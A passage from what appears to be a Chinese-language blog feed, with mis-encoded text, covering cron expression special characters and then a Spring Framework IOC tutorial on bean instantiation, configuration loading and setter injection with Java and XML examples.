align="left">æ—¶</td><td align="left">0-23</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">æ—¥</td><td align="left">1-31</td><td align="left"><code>, - * ? / L W</code></td></tr><tr><td align="left">æœˆ</td><td align="left">1-12 æˆ– JAN-DEC</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">å‘¨</td><td align="left">0-7 æˆ– SUN-SATï¼ˆ0å’Œ7éƒ½æ˜¯å‘¨æ—¥ï¼‰</td><td align="left"><code>, - * ? / L #</code></td></tr><tr><td align="left">å¹´ï¼ˆå¯é€‰ï¼‰</td><td align="left">1970-2099</td><td align="left"><code>, - * /</code></td></tr></tbody></table><h3 id="ç‰¹æ®Šå­—ç¬¦å«ä¹‰"><a href="#ç‰¹æ®Šå­—ç¬¦å«ä¹‰" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦å«ä¹‰"></a>ç‰¹æ®Šå­—ç¬¦å«ä¹‰</h3><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">å«ä¹‰</th><th align="left">ç¤ºä¾‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><code>*</code></td><td align="left">æ‰€æœ‰å€¼</td><td align="left"><code>* * * * * ?</code></td><td align="left">æ¯ç§’æ‰§è¡Œ</td></tr><tr><td align="left"><code>?</code></td><td align="left">ä¸æŒ‡å®šå€¼</td><td align="left"><code>0 0 10 * * ?</code></td><td align="left">æ¯å¤©10ç‚¹ï¼Œä¸å…³å¿ƒå‘¨å‡ </td></tr><tr><td align="left"><code>-</code></td><td align="left">åŒºé—´</td><td align="left"><code>0 0 10-12 * * ?</code></td><td align="left">10ç‚¹ã€11ç‚¹ã€12ç‚¹</td></tr><tr><td align="left"><code>,</code></td><td align="left">å¤šä¸ªå€¼</td><td align="left"><code>0 0 10,14,18 * * ?</code></td><td align="left">10ç‚¹ã€14ç‚¹ã€18ç‚¹</td></tr><tr><td align="left"><code>/</code></td><td align="left">æ­¥é•¿</td><td align="left"><code>0 0/5 * * * ?</code></td><td align="left">æ¯5åˆ†é’Ÿ</td></tr><tr><td align="left"><code>L</code></td><td align="left">æœ€å</td><td align="left"><code>0 0 L * * ?</code></td><td align="left">æ¯æœˆæœ€åä¸€å¤©</td></tr><tr><td align="left"><code>W</code></td><td align="left">å·¥ä½œæ—¥</td><td align="left"><code>0 0 0 15W * ?</code></td><td align="left">ç¦»15å·æœ€è¿‘çš„å·¥ä½œæ—¥</td></tr><tr><td align="left"><code>#</code></td><td align="left">ç¬¬å‡ ä¸ª</td><td align="left"><code>0 0 0 ? * 2#3</code></td><td align="left">æ¯æœˆç¬¬3ä¸ªå‘¨äºŒ</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFrameworkæ¡†æ¶-IOC</title>
      <link href="/2025/12/26/SpringFramework%E6%A1%86%E6%9E%B6-IOC/"/>
      <url>/2025/12/26/SpringFramework%E6%A1%86%E6%9E%B6-IOC/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringFrameworkæ¡†æ¶-IOC"><a href="#SpringFrameworkæ¡†æ¶-IOC" class="headerlink" title="SpringFrameworkæ¡†æ¶-IOC"></a>SpringFrameworkæ¡†æ¶-IOC</h1><p>IOCï¼ˆæ§åˆ¶åè½¬ï¼‰æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼Œå®ƒå°†ä¼ ç»Ÿç¨‹åºä¸­ç”±å¼€å‘è€…ä¸»åŠ¨åˆ›å»ºå’Œç®¡ç†å¯¹è±¡çš„æ§åˆ¶æƒåè½¬ç»™å¤–éƒ¨å®¹å™¨ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œç¨‹åºä¸å†é€šè¿‡<code>new</code>å…³é”®å­—ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯ç”±å®¹å™¨è´Ÿè´£å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€ä¾èµ–æ³¨å…¥å’Œé…ç½®ç»„è£…</p><br/><h2 id="Beanå¯¹è±¡çš„å®ä¾‹åŒ–"><a href="#Beanå¯¹è±¡çš„å®ä¾‹åŒ–" class="headerlink" title="Beanå¯¹è±¡çš„å®ä¾‹åŒ–"></a>Beanå¯¹è±¡çš„å®ä¾‹åŒ–</h2><p>åœ¨Springæ¡†æ¶ä¸­ï¼Œç±»çš„ç”Ÿå‘½å‘¨æœŸç”±Springå®¹å™¨ç®¡ç†ï¼Œæ˜¯æ™®é€šJavaç±»çš„å®ä¾‹ï¼Œè¿™ç§æœºåˆ¶çš„åº•å±‚æ˜¯é€šè¿‡åå°„è·å–ç±»å¹¶æ–°å»ºå®ä¾‹åŒ–çš„ã€‚ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹æ³•ç”¨äºè·å–å®ä¾‹å¯¹è±¡</p><h3 id="æ„é€ å™¨å®ä¾‹åŒ–"><a href="#æ„é€ å™¨å®ä¾‹åŒ–" class="headerlink" title="æ„é€ å™¨å®ä¾‹åŒ–"></a>æ„é€ å™¨å®ä¾‹åŒ–</h3><p>å…ˆåˆ›å»ºä¸€ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function of TestBean is invoked...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>resource</code>ç›®å½•ä¸‹æ–°å»ºXMLé…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œå–å<code>spring.xml</code>å®¹å™¨ä¼šé€šè¿‡è¿™ä¸ªæ–‡ä»¶è§£æç±»å¯¹è±¡</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- collaborators and configuration for this bean go here --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>id</code>å±æ€§æ˜¯è¾¨è¯†è¯¥beançš„å”¯ä¸€æ ‡è¯†ï¼Œ<code>class</code>å±æ€§æŒ‡å‘è¯¥ç±»çš„classè·¯å¾„ï¼Œæ­¤å¤–<code>&lt;bean&gt;</code>æ ‡ç­¾ä¸‹è¿˜å¯ä»¥å®šä¹‰å¾ˆå¤šå­æ ‡ç­¾ï¼Œä½†ç›®å‰æš‚ä¸æ¶‰åŠã€‚</p><p>æ¥ä¸‹æ¥æµ‹è¯•ä½¿ç”¨Springè·å–ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œéœ€è¦å®ä¾‹åŒ–ä¸€ä¸ª<code>ClassPathXmlApplicationContext</code>ç±»å¹¶ä¼ å…¥xmlæ–‡ä»¶åç”¨ä»¥è§£æï¼Œä¹‹åå°±å¯é€šè¿‡<code>getBean()</code>æ–¹æ³•è·å–å®ä¾‹ï¼Œå¹¶èƒ½æ­£å¸¸è°ƒç”¨è¯¥å®ä¾‹çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é™æ€å·¥å‚å®ä¾‹åŒ–"><a href="#é™æ€å·¥å‚å®ä¾‹åŒ–" class="headerlink" title="é™æ€å·¥å‚å®ä¾‹åŒ–"></a>é™æ€å·¥å‚å®ä¾‹åŒ–</h3><p>å†™ä¸€ä¸ª<code>TestBean2</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;TestBean2 test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å†™ä¸€ä¸ª<code>StaticFactory</code>ç”¨æ¥æ‰§è¡Œæ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TestBean2 <span class="title function_">getTestBean2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestBean2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™é…ç½®æ–‡ä»¶æ—¶ï¼Œ<code>class</code>å±æ€§éœ€è¦æŒ‡å‘<code>StaticFactory</code>ç±»ï¼Œå¹¶æ·»åŠ <code>factory-method</code>å±æ€§ï¼ŒæŒ‡å‘<code>TestBean2</code>çš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Factory.StaticFactory&quot;</span> factory-method=<span class="string">&quot;getTestBean2&quot;</span>&gt;</span><br><span class="line">        &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="built_in">this</span> bean go here --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç¨‹åºå¦‚ä¸‹ï¼Œèƒ½å¤Ÿæ­£å¸¸è·å–å®ä¾‹å¯¹è±¡å¹¶è°ƒç”¨ç›¸åº”æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean2</span> <span class="variable">testBean2</span> <span class="operator">=</span> (TestBean2) context.getBean(<span class="string">&quot;testBean2&quot;</span>);</span><br><span class="line">        testBean2.Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†é™æ€å·¥å‚å®ä¾‹åŒ–è¿˜æœ‰ä¸€ä¸ªå®ä¾‹å·¥å‚å®ä¾‹åŒ–ï¼Œä¸åŒç‚¹åœ¨äºå®ä¾‹å·¥å‚çš„æ„é€ æ–¹æ³•ä¸æ˜¯é™æ€æ–¹æ³•ï¼Œè¿™ç§æ„é€ æ–¹æ³•è¦å•ç‹¬ä¸ºå·¥å‚å’Œç›®æ ‡ç±»å†™é…ç½®æ–‡ä»¶ï¼Œæœ¬è´¨æ˜¯å…ˆå®ä¾‹åŒ–å·¥å‚å†è°ƒç”¨æ„é€ æ–¹æ³•</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;InstanceFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Factory.InstanceFactory&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;InstanceFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getTestBean2&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- collaborators and configuration for this bean go here --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>IOCåˆ›å»ºçš„å®ä¾‹åŒ–å¯¹è±¡æ˜¯å•ä¾‹ï¼Œè·å–çš„åŒç±»å¯¹è±¡éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤è¿è¡Œä¸‹é¢çš„ç¨‹åºä¼šæ‰“å°<code>true</code>ï¼Œå¹¶ä¸”ç”±äºè¿™ç§æ„é€ æ–¹å¼åªèƒ½è°ƒç”¨ç©ºæ„é€ å™¨ï¼Œè¿™è¦æ±‚ç›®æ ‡ç±»çš„ç©ºæ„é€ æ–¹æ³•å¿…é¡»å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean2</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        System.out.println(testBean2==testBean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="é…ç½®æ–‡ä»¶åŠ è½½"><a href="#é…ç½®æ–‡ä»¶åŠ è½½" class="headerlink" title="é…ç½®æ–‡ä»¶åŠ è½½"></a>é…ç½®æ–‡ä»¶åŠ è½½</h2><p>é…ç½®æ–‡ä»¶ä¸­beançš„<code>class</code>å±æ€§å¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œå¯¹äºå¤šä¸ªé…ç½®æ–‡ä»¶ä¸»è¦æœ‰ä¸¤ç§åŠ è½½æ–¹æ³•</p><h3 id="åˆ©ç”¨å¯å˜å‚æ•°åŠ è½½"><a href="#åˆ©ç”¨å¯å˜å‚æ•°åŠ è½½" class="headerlink" title="åˆ©ç”¨å¯å˜å‚æ•°åŠ è½½"></a>åˆ©ç”¨å¯å˜å‚æ•°åŠ è½½</h3><p><code>ClassPathXmlApplicationContext()</code>é‡Œä¼ é€’çš„å‚æ•°å¯ä»¥æ˜¯å¤šä¸ªï¼Œå¦‚æœæƒ³è¦åŠ è½½å¤šä¸ªé…ç½®æ–‡ä»¶å¯ä»¥ç›´æ¥ä¼ é€’å¤šä¸ªå‚æ•°ï¼Œæ¯”å¦‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring1.xml&quot;</span>,<span class="string">&quot;spring2.xml&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="é€šè¿‡æ€»é…ç½®æ–‡ä»¶åŠ è½½"><a href="#é€šè¿‡æ€»é…ç½®æ–‡ä»¶åŠ è½½" class="headerlink" title="é€šè¿‡æ€»é…ç½®æ–‡ä»¶åŠ è½½"></a>é€šè¿‡æ€»é…ç½®æ–‡ä»¶åŠ è½½</h3><p>é…ç½®æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨<code>impoirt</code>åŠ è½½å­é…ç½®æ–‡ä»¶ï¼Œåé¢è°ƒç”¨<code>ClassPathXmlApplicationContext()</code>æ—¶åªéœ€è¦ä¼ é€’æ€»é…ç½®æ–‡ä»¶å³å¯ï¼Œæ¯”å¦‚åœ¨<code>spring.xml</code>æ–‡ä»¶ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span><br><span class="line">        &lt;!-- collaborators and configuration <span class="keyword">for</span> <span class="built_in">this</span> bean go here --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;<span class="keyword">import</span> resource=<span class="string">&quot;subSpring.xml&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>è¯¥é…ç½®æ–‡ä»¶åŒæ—¶åŒ…å«äº†<code>subSpring.xml</code>çš„é…ç½®ä¿¡æ¯</p><br/><h2 id="æ‰‹åŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰"><a href="#æ‰‹åŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰" class="headerlink" title="æ‰‹åŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰"></a>æ‰‹åŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰</h2><p>æ³¨å…¥æ˜¯æŒ‡ç”±å¤–éƒ¨å®¹å™¨å°†ä¾èµ–å¯¹è±¡è‡ªåŠ¨è®¾ç½®åˆ°ç›®æ ‡å¯¹è±¡çš„å±æ€§æˆ–æ„é€ å‡½æ•°ä¸­ï¼Œè€Œä¸æ˜¯ç”±å¯¹è±¡è‡ªå·±ä¸»åŠ¨å»è·å–ï¼Œæ¯”å¦‚ä¸‹é¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TestBean2 testBean2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>testBean2</code>å¯¹è±¡é›†æˆè¿›äº†<code>TestBean</code>ç±»çš„å±æ€§<code>testBean2</code>ï¼Œè¿™æ ·å°±ä¸ç”¨åœ¨ç±»çš„å†…éƒ¨å®ä¾‹åŒ–<code>TestBean2</code>ï¼Œè€Œæ˜¯é€šè¿‡å¤–éƒ¨å°†<code>testBean2</code>ä¼ è¿›æ¥å®ç°å¯¹å…¶çš„ä¾èµ–</p><h3 id="setæ³¨å…¥"><a href="#setæ³¨å…¥" class="headerlink" title="setæ³¨å…¥"></a>setæ³¨å…¥</h3><p>ä½¿ç”¨setæ³¨å…¥å®ç°ä¸Šé¢çš„ä¾‹å­éœ€è¦å®ç°set()æ–¹æ³•å¯¹<code>testBean2</code>è¿›è¡Œèµ‹å€¼å¹¶è°ƒç”¨å…¶æ–¹æ³•ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2.test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTestBean2</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºæ²¡æœ‰ç»™<code>setTestBean2()</code>ä¼ é€’å‚æ•°ï¼Œç›´æ¥è¿è¡Œä¼šçˆ†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œè¿™é‡Œè¿˜è¦æ”¹é…ç½®æ–‡ä»¶ï¼Œè®©è°ƒç”¨<code>setTestBean2()</code>æ—¶è‡ªåŠ¨ä¼ å…¥ä¸€ä¸ªå®ä¾‹åŒ–å¥½çš„<code>TestBean2</code>å¯¹è±¡ã€‚éœ€è¦åœ¨<code>testBean</code>çš„<code>&lt;bean&gt;</code>æ ‡ç­¾ä¸‹è®¾ç½®<code>&lt;property&gt;</code>æ ‡ç­¾å¯¹å­—æ®µè¿›è¡Œæ³¨å…¥</p><p><code>name</code>å±æ€§æŒ‡å‘beanå¯¹è±¡ä¸­<code>setter</code>æ–¹æ³•ä¸­æŒ‡å‘çš„å­—æ®µåç§°ï¼Œ<code>ref</code> æŒ‡å‘å¦ä¸€ä¸ªbeançš„<code>id</code>ï¼ŒSpringä¼šæŠŠè¿™ä¸ªBeanå¯¹è±¡ä½œä¸ºå‚æ•°å€¼ä¼ é€’è¿‡å»</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æµ‹è¯•ç¨‹åºè°ƒç”¨<code>testBean</code>çš„<code>test()</code>æ–¹æ³•æˆåŠŸæ‰“å°<code>TestBean2 test</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> setæ³¨å…¥ä¹Ÿå¯ä»¥ä¸ºåŸºæœ¬ç±»å‹å’Œé›†åˆç±»å‹çš„å­—æ®µèµ‹å€¼ï¼Œè¿™åŒæ ·éœ€è¦å®ç°<code>setter</code>æ–¹æ³•ï¼Œä¸åŒç‚¹åœ¨äºä½¿ç”¨<code>value</code>å±æ€§æŒ‡å‘ä¼ é€’çš„å‚æ•° </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span> <span class="attr">value</span>=<span class="string">&quot;test01&quot;</span> <span class="attr">key</span>=<span class="string">&quot;test&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 